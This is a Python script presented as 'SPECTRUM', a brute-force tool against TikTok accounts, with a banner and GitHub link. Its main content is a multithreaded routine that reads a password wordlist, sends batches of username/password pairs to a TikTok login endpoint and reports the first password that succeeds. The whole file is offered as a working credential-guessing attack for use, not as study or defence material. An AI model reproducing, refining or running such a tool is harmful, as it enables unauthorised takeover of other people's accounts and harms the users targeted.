import requests
from colorama import Fore, Style, init
import threading
from subprocess import call

init()

red = Fore.LIGHTRED_EX
blue = Fore.LIGHTBLUE_EX
reset = Style.RESET_ALL
green = Fore.LIGHTGREEN_EX
yellow = Fore.YELLOW
magenta = Fore.LIGHTMAGENTA_EX

adv = yellow + "[+]" + magenta

call(["clear"])

print()

print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⢀⣼⣷⣦⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣩⠙⢷⣦⠀⣴⣿⣿⠃⢀⣄⢠⡞⠉⠝⠩⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢫⣿⢷⣾⣿⢛⣿⣿⠁⠀⠈⢹⠋⢠⣤⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡀⠙⠻⣥⡾⠟⣻⡿⣥⡙⣷⢤⣴⣿⣶⣄⠁⣴⣃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠈⠙⢾⣏⣱⣿⣻⣷⣴⣿⣿⣿⣿⠟⠁⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠀⢀⣀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡎⡀⢀⣾⣽⡷⣄⡀⠀⠀⠙⠻⣿⣿⣿⣿⣾⣟⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣯⠟⢁⡵⠞⢾⣟⣿⣿⣻⣦⣄⠀⠀⠈⠙⢿⣿⣿⣿⣿⣧⡀⠙⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣺⠽⠚⢉⣠⣶⠏⣳⠾⢃⣿⣿⣡⡟⢧⠾⠷⣦⣤⣶⣿⢾⣿⣿⣿⣿⣿⣦⣄⣨⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣤⣶⠿⠛⢉⣠⣴⠞⢩⡾⠃⣼⠛⢠⡟⢉⣼⠟⢷⣾⣶⣾⠿⠿⢿⣥⣾⣿⣷⡝⠿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀
⢸⠻⠋⣡⣴⡾⢉⡶⠇⣰⠟⢁⡬⠁⢠⠇⢀⢸⣿⣦⣀⣿⡯⢠⢾⣿⣶⡦⢿⣿⠋⣠⠶⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⢹⣷⣤⡀⠀⠀⠀
⠸⡄⠸⣯⡇⢰⠾⢁⣤⠋⢠⡎⠀⠴⢂⣤⠞⢋⣠⣤⠿⢯⡀⡏⣾⣿⠋⠀⠀⠈⠓⠦⣄⠻⣭⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣻⢿⣇⡙⢶⣄⠀
⢠⣽⣦⡈⠙⢾⣀⡌⠁⠴⠆⢀⡼⠟⢋⣤⣾⠟⠉⠀⠀⠀⠙⣿⣿⡏⠀⠀⠀⠀⠀⠀⢸⠀⠬⠙⢿⣏⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⠀⠙⠀
⠈⠻⣿⣿⣦⡀⠉⠳⣼⡧⠞⢋⣤⣴⠿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠻⣝⢦⣀⠀⠀⠀⣠⠞⢀⡴⠛⠳⢿⣿⣹⣄⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠙⢿⣿⣦⣀⠀⢀⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠮⣝⠒⠮⠅⣰⠋⠀⠀⠀⠀⠉⠳⢌⡑⢦⡀⠉⠻⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣷⣾⣏⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⣴⠃⣀⡀⠀⠀⠀⠀⠀⠀⠙⠲⣌⡓⢤⡀⣹⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠒⠒⠛⠒⠒⠒⠒⠚⠛⠛⠚⠛⠛⠛⠛⠛⠛⠛⠓""")

print(" ________________________________________________________________")

print()

print("              SPECTRUM - BRUTE FORCE TOOL OF TIKTOK")


print()

print("               https://github.com/sk-k1ng/spectrum" + reset)

print(" ________________________________________________________________")

print()
print()
print()

init()

red = Fore.LIGHTRED_EX
blue = Fore.LIGHTBLUE_EX
reset = Style.RESET_ALL
green = Fore.LIGHTGREEN_EX
yellow = Fore.YELLOW
magenta = Fore.LIGHTMAGENTA_EX

adv = yellow + "[+]" + magenta

def brute_force_worker(user, session, wordlist, start_point, index, chunk_size=10):
    global password

    with open(wordlist, 'r') as f:
        words = f.readlines()

    for i in range(start_point, len(words), chunk_size):
        chunk = [word.strip() for word in words[i:i+chunk_size]]
        print(adv, f"Thread {index} cracking accounts {i + 1}-{i + chunk_size}/{len(words)}", reset)
        try:
            passwords = [{"username": user, "password": word} for word in chunk]
            response = session.post('https://www.tiktok.com/node/login_v2/index', json=passwords)
            results = response.json()

            for result, word in zip(results, chunk):
                if result.get('status') == 200:
                    password = word
                    print()
                    print(green + f" success! password is {word}" + reset)
                    return
                else:
                    print()
                    print(red + f" failed! password not found: {word}" + reset)

        except Exception as e:
            print()
            print(red + f" Error: {e}. Pausing for user input..." + reset)
            input("Press Enter to resume...")

def brute_force_parallel(user, wordlist, start_point, num_threads=4, chunk_size=10):
    global password

    session = requests.Session()
    call(["clear"])

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=brute_force_worker, args=(user, session, wordlist, start_point, i, chunk_size))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

user, password, wordlist, start_point = input(yellow + " > user: " + reset), None, input(yellow + " > wordlist: " + reset), input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)

try:
    start_point = int(start_point)
except ValueError:
    print(red + " Invalid input. Defaulting to the beginning of the wordlist." + reset)
    start_point = 0

brute_force_parallel(user, wordlist, start_point)
